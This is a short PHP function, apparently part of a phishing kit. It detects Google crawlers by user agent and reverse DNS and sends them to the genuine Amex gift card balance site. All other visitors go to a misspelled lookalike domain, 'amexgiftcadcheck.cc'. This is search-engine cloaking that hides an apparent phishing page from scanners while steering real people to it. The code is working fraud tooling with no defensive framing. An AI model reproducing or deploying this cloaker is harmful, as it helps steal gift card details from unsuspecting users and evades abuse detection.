function is_google_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];
    $host = gethostbyaddr($ip);

    $google_bots = [
        'googlebot',
        'adsbot-google',
        'mediapartners-google',
        'googlebot-image',
        'googlebot-news',
        'googlebot-video',
        'adsbot-google-mobile',
        'adsbot-google-mobile-apps',
        'google-structured-data-testing-tool',
        'google-read-aloud',
        'google-sitemaps',
        'google-favicon',
        'feedfetcher-google',
        'google-weblight',
        'google-web-preview',
        'storebot-google',
        'google-speech',
        'googleassistant',
        'google-analytics',
        'apis-google',
        'chrome-lighthouse',
        'google-crc',
        'googleusercontent.com',
        'appengine.google.com'
    ];

    foreach ($google_bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            header("Location: https://balance.amexgiftcard.com", true, 302);
            exit;
        }
    }

    if (strpos($host, 'google') !== false || strpos($host, '1e100.net') !== false) {
        header("Location: https://balance.amexgiftcard.com", true, 302);
        exit;
    }

    // اگر به هیچ‌وجه بات نبود، ریدایرکت به صفحه اصلی کاربر
    header("Location: https://amexgiftcadcheck.cc/amex/", true, 302);
    exit;
}
